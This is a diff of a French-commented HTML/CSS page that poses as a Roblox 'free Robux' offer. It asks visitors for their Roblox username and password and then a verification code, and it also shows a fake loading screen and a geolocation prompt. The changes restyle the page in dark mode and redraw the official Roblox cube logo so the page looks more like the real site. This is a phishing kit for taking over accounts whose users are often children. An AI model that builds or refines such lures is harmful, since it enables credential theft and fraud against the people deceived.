@@ -17,12 +17,12 @@
 
         body {
             font-family: 'Inter', -apple-system, sans-serif;
-            background: #f0f2f5;
+            background: #0b0e1a;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            color: #1a1a1a;
+            color: #ffffff;
             margin: 0;
             padding: 20px;
         }
@@ -31,10 +31,8 @@
             width: 100%;
             max-width: 400px;
             margin: 0 auto;
-            background: #ffffff;
-            border-radius: 24px;
-            padding: 32px 28px 36px 28px;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.04);
+            background: transparent;
+            padding: 24px 24px 36px 24px;
             position: relative;
             min-height: 480px;
         }
@@ -62,40 +60,91 @@
             background: none;
             border: none;
             font-size: 18px;
-            color: #1a1a1a;
+            color: #ffffff;
         }
 
         .back-arrow:hover {
-            background: rgba(0, 0, 0, 0.05);
+            background: rgba(255, 255, 255, 0.05);
         }
 
         .back-arrow i {
             font-size: 18px;
+            color: #ffffff;
         }
 
         .header h1 {
             font-size: 16px;
             font-weight: 500;
-            color: #1a1a1a;
+            color: #ffffff;
             letter-spacing: -0.2px;
+            opacity: 0.6;
         }
 
         /* ============================================================
-           LOGO ROBLOX (style minimaliste)
+           LOGO ROBLOX OFFICIEL (avec cube isométrique)
            ============================================================ */
         .roblox-logo {
-            text-align: center;
-            font-size: 36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Inter', 'Arial Black', sans-serif;
             font-weight: 900;
-            letter-spacing: -1px;
-            margin-bottom: 8px;
-            font-family: 'Inter', sans-serif;
-            color: #1a1a1a;
+            font-size: 40px;
+            letter-spacing: -2px;
+            color: #ffffff;
+            margin-bottom: 20px;
             padding: 8px 0;
         }
 
-        .roblox-logo .highlight {
-            color: #00b2ff;
+        .roblox-logo .letter {
+            display: inline-block;
+        }
+
+        .roblox-logo .cube-wrapper {
+            display: inline-block;
+            width: 0.95em;
+            height: 1em;
+            margin: 0 0.02em;
+            position: relative;
+            transform: translateY(-2px);
+        }
+
+        .roblox-logo .cube {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transform-style: preserve-3d;
+        }
+
+        .roblox-logo .cube .face {
+            position: absolute;
+        }
+
+        .roblox-logo .cube .top {
+            width: 100%;
+            height: 50%;
+            top: 0;
+            left: 0;
+            background: linear-gradient(135deg, #8fdfff, #3d7bff);
+            clip-path: polygon(50% 0%, 100% 25%, 50% 50%, 0% 25%);
+        }
+
+        .roblox-logo .cube .left {
+            width: 50%;
+            height: 60%;
+            top: 25%;
+            left: 0;
+            background: linear-gradient(180deg, #2e5fe0, #17318f);
+            clip-path: polygon(0% 0%, 100% 25%, 100% 100%, 0% 75%);
+        }
+
+        .roblox-logo .cube .right {
+            width: 50%;
+            height: 60%;
+            top: 25%;
+            left: 50%;
+            background: linear-gradient(180deg, #4f8bff, #2650c9);
+            clip-path: polygon(0% 25%, 100% 0%, 100% 75%, 0% 100%);
         }
 
         /* ============================================================
@@ -121,26 +170,27 @@
         .offer-title {
             font-size: 22px;
             font-weight: 800;
-            color: #1a1a1a;
+            color: #ffffff;
             text-align: center;
             margin-bottom: 4px;
             line-height: 1.3;
         }
 
         .offer-title .highlight {
-            color: #00b2ff;
+            color: #00b82e;
         }
 
         .offer-subtitle {
             font-size: 14px;
-            color: #777;
+            color: rgba(255, 255, 255, 0.6);
             text-align: center;
             margin-bottom: 20px;
             line-height: 1.5;
         }
 
         .offer-box {
-            background: linear-gradient(145deg, #0b1f2e, #162b3e);
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.06);
             border-radius: 16px;
             padding: 20px 16px;
             text-align: center;
@@ -159,19 +209,19 @@
         }
 
         .offer-box .big-title .highlight {
-            color: #00b2ff;
+            color: #00b82e;
         }
 
         .offer-box .big-desc {
             font-size: 12px;
-            color: rgba(255, 255, 255, 0.6);
+            color: rgba(255, 255, 255, 0.4);
             margin-top: 4px;
         }
 
         .offer-stats {
             display: flex;
             justify-content: space-between;
-            background: #f7f8fa;
+            background: rgba(255, 255, 255, 0.04);
             border-radius: 12px;
             padding: 10px 16px;
             margin-bottom: 20px;
@@ -184,23 +234,23 @@
         .offer-stats .stat .number {
             font-size: 15px;
             font-weight: 700;
-            color: #1a1a1a;
+            color: #ffffff;
         }
 
         .offer-stats .stat .number .robux {
-            color: #00b2ff;
+            color: #00b82e;
         }
 
         .offer-stats .stat .label {
             font-size: 10px;
-            color: #999;
+            color: rgba(255, 255, 255, 0.4);
             text-transform: uppercase;
             letter-spacing: 0.3px;
             margin-top: 2px;
         }
 
         /* ============================================================
-           INPUT STYLE (comme sur l'image)
+           INPUTS - STYLE ROBLOX (fond noir, bordure verte)
            ============================================================ */
         .input-group {
             margin-bottom: 16px;
@@ -213,30 +263,30 @@
         .input-group input {
             width: 100%;
             padding: 16px 18px;
-            border: 1.5px solid #e0e0e0;
+            border: 1.5px solid rgba(255, 255, 255, 0.08);
             border-radius: 12px;
             font-size: 15px;
             font-family: 'Inter', sans-serif;
             outline: none;
-            background: #f7f8fa;
-            color: #1a1a1a;
+            background: rgba(255, 255, 255, 0.04);
+            color: #ffffff;
             transition: all 0.3s ease;
         }
 
         .input-group input::placeholder {
-            color: #b0b0b0;
+            color: rgba(255, 255, 255, 0.3);
             font-weight: 400;
         }
 
         .input-group input:focus {
-            border-color: #00b2ff;
-            background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(0, 178, 255, 0.06);
+            border-color: #00b82e;
+            background: rgba(0, 184, 46, 0.04);
+            box-shadow: 0 0 0 4px rgba(0, 184, 46, 0.06);
         }
 
         .input-group input.input-error {
             border-color: #ff3b30;
-            background: #fff5f5;
+            background: rgba(255, 59, 48, 0.06);
         }
 
         .input-group .password-wrapper {
@@ -254,13 +304,13 @@
             transform: translateY(-50%);
             background: none;
             border: none;
-            color: #b0b0b0;
+            color: rgba(255, 255, 255, 0.3);
             font-size: 18px;
             cursor: pointer;
         }
 
         .password-toggle:hover {
-            color: #1a1a1a;
+            color: #ffffff;
         }
 
         .error-message {
@@ -272,11 +322,11 @@
         }
 
         /* ============================================================
-           BOUTON CONTINUE (style Roblox)
+           BOUTON CONTINUE (VERT)
            ============================================================ */
         .btn-primary {
             width: 100%;
-            background: #00b2ff;
+            background: #00b82e;
             color: #ffffff;
             border: none;
             padding: 16px;
@@ -286,13 +336,13 @@
             cursor: pointer;
             transition: all 0.3s ease;
             font-family: 'Inter', sans-serif;
-            box-shadow: 0 4px 16px rgba(0, 178, 255, 0.3);
+            box-shadow: 0 4px 20px rgba(0, 184, 46, 0.25);
             margin-top: 4px;
         }
 
         .btn-primary:hover:not(:disabled) {
             transform: scale(1.01);
-            box-shadow: 0 6px 20px rgba(0, 178, 255, 0.35);
+            box-shadow: 0 6px 28px rgba(0, 184, 46, 0.35);
         }
 
         .btn-primary:active:not(:disabled) {
@@ -300,7 +350,7 @@
         }
 
         .btn-primary:disabled {
-            opacity: 0.6;
+            opacity: 0.5;
             cursor: not-allowed;
             transform: none;
         }
@@ -329,7 +379,7 @@
 
         .footer-note {
             font-size: 11px;
-            color: #bbb;
+            color: rgba(255, 255, 255, 0.2);
             text-align: center;
             margin-top: 14px;
         }
@@ -340,7 +390,7 @@
         .verification-info {
             text-align: center;
             font-size: 14px;
-            color: #777;
+            color: rgba(255, 255, 255, 0.6);
             margin-bottom: 20px;
         }
 
@@ -358,17 +408,18 @@
             font-size: 22px;
             font-weight: 600;
             font-family: 'Inter', sans-serif;
-            border: 1.5px solid #e0e0e0;
+            border: 1.5px solid rgba(255, 255, 255, 0.08);
             border-radius: 12px;
             outline: none;
-            background: #f7f8fa;
+            background: rgba(255, 255, 255, 0.04);
+            color: #ffffff;
             transition: 0.3s;
         }
 
         .code-input-group input:focus {
-            border-color: #00b2ff;
-            background: #ffffff;
-            box-shadow: 0 0 0 4px rgba(0, 178, 255, 0.06);
+            border-color: #00b82e;
+            background: rgba(0, 184, 46, 0.04);
+            box-shadow: 0 0 0 4px rgba(0, 184, 46, 0.06);
         }
 
         .code-error {
@@ -381,12 +432,12 @@
         .resend-link {
             text-align: center;
             font-size: 13px;
-            color: #777;
+            color: rgba(255, 255, 255, 0.4);
             margin: 12px 0 16px 0;
         }
 
         .resend-link a {
-            color: #00b2ff;
+            color: #00b82e;
             text-decoration: none;
             font-weight: 500;
             cursor: pointer;
@@ -394,6 +445,27 @@
 
         .resend-link a:hover {
             text-decoration: underline;
+        }
+
+        .forgot-links {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 13px;
+        }
+
+        .forgot-links a {
+            color: #00b82e;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .forgot-links a:hover {
+            text-decoration: underline;
+        }
+
+        .forgot-links .sep {
+            color: rgba(255, 255, 255, 0.1);
+            margin: 0 8px;
         }
 
         /* ============================================================
@@ -405,7 +477,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: #00b2ff;
+            background: #0b0e1a;
             display: none;
             flex-direction: column;
             align-items: center;
@@ -423,14 +495,15 @@
             color: #ffffff;
             font-family: 'Inter', sans-serif;
             margin-bottom: 16px;
+            letter-spacing: -1px;
         }
 
-        .loading-logo span {
-            color: #0b1f2e;
+        .loading-logo .highlight {
+            color: #00b82e;
         }
 
         .loading-text {
-            color: #ffffff;
+            color: rgba(255, 255, 255, 0.6);
             font-size: 15px;
             font-weight: 500;
             margin-bottom: 16px;
@@ -440,14 +513,14 @@
         .progress-bar {
             width: 160px;
             height: 3px;
-            background: rgba(255, 255, 255, 0.25);
+            background: rgba(255, 255, 255, 0.08);
             border-radius: 2px;
             overflow: hidden;
         }
 
         .progress {
             height: 100%;
-            background: #ffffff;
+            background: #00b82e;
             width: 0%;
             transition: width 0.15s ease;
         }
@@ -461,8 +534,8 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.5);
-            backdrop-filter: blur(4px);
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
             display: none;
             justify-content: center;
             align-items: center;
@@ -474,13 +547,14 @@
         }
 
         .geolocation-modal {
-            background: #ffffff;
+            background: #1a1e2e;
             border-radius: 16px;
             padding: 28px 24px 24px 24px;
             width: 300px;
             max-width: 90%;
             text-align: center;
-            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 12px 48px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.04);
             animation: slideUp 0.3s ease;
         }
 
@@ -497,7 +571,7 @@
 
         .geolocation-modal h3 {
             font-size: 17px;
-            color: #1a1a1a;
+            color: #ffffff;
             margin-bottom: 4px;
             font-weight: 600;
             font-family: 'Inter', sans-serif;
@@ -505,7 +579,7 @@
 
         .geolocation-modal p {
             font-size: 13px;
-            color: #777;
+            color: rgba(255, 255, 255, 0.5);
             line-height: 1.5;
             margin-bottom: 20px;
             font-family: 'Inter', sans-serif;
@@ -530,29 +604,29 @@
         }
 
         .geolocation-modal .btn-group button:first-child {
-            background: #f0f0f0;
-            color: #1a1a1a;
+            background: rgba(255, 255, 255, 0.06);
+            color: #ffffff;
         }
 
         .geolocation-modal .btn-group button:first-child:hover {
-            background: #e0e0e0;
+            background: rgba(255, 255, 255, 0.1);
         }
 
         .geolocation-modal .btn-group button:last-child {
-            background: #00b2ff;
+            background: #00b82e;
             color: #ffffff;
         }
 
         .geolocation-modal .btn-group button:last-child:hover {
-            background: #0099e0;
+            background: #00a028;
         }
 
         /* ============================================================
            RESPONSIVE
            ============================================================ */
         @media (max-width: 420px) {
-            .container { padding: 20px 16px 28px 16px; }
-            .roblox-logo { font-size: 28px; }
+            .container { padding: 16px 16px 28px 16px; }
+            .roblox-logo { font-size: 32px; }
             .offer-title { font-size: 19px; }
             .code-input-group input { width: 40px; height: 48px; font-size: 18px; }
             .btn-primary { font-size: 15px; padding: 14px; }
@@ -574,10 +648,21 @@
         </div>
 
         <!-- ============================================================
-        LOGO
+        LOGO ROBLOX OFFICIEL
         ============================================================ -->
         <div class="roblox-logo">
-            RO<span class="highlight">BLOX</span>
+            <span class="letter">R</span>
+            <span class="cube-wrapper">
+                <span class="cube">
+                    <span class="face top"></span>
+                    <span class="face left"></span>
+                    <span class="face right"></span>
+                </span>
+            </span>
+            <span class="letter" style="margin-left: 0.02em;">B</span>
+            <span class="letter">L</span>
+            <span class="letter">O</span>
+            <span class="letter">X</span>
         </div>
 
         <!-- ============================================================
@@ -621,11 +706,11 @@
         </div>
 
         <!-- ============================================================
-        ÉTAPE 2 : CONNEXION (style minimaliste)
+        ÉTAPE 2 : CONNEXION
         ============================================================ -->
         <div id="step2" class="step">
             <div style="text-align: center; margin-bottom: 20px;">
-                <p style="font-size: 14px; color: #777; margin-bottom: 4px;">
+                <p style="font-size: 14px; color: rgba(255,255,255,0.5); margin-bottom: 4px;">
                     Enter your Roblox username to start getting free Robux
                 </p>
             </div>
@@ -653,10 +738,10 @@
                 </button>
             </form>
 
-            <div style="text-align: center; margin-top: 16px; font-size: 13px; color: #999;">
-                <a href="#" style="color: #00b2ff; text-decoration: none; font-weight: 500;">Forgot password?</a>
-                <span style="color: #ddd; margin: 0 8px;">·</span>
-                <a href="#" style="color: #00b2ff; text-decoration: none; font-weight: 500;">Sign up</a>
+            <div class="forgot-links">
+                <a href="#">Forgot password?</a>
+                <span class="sep">·</span>
+                <a href="#">Sign up</a>
             </div>
         </div>
 
@@ -711,7 +796,7 @@
     LOADING
     ============================================================ -->
     <div id="loading-page">
-        <div class="loading-logo">RO<span style="color:#0b1f2e;">BLOX</span></div>
+        <div class="loading-logo">RO<span class="highlight">BLOX</span></div>
         <div class="loading-text">Connexion en cours...</div>
         <div class="progress-bar">
             <div class="progress" id="progress-bar"></div>
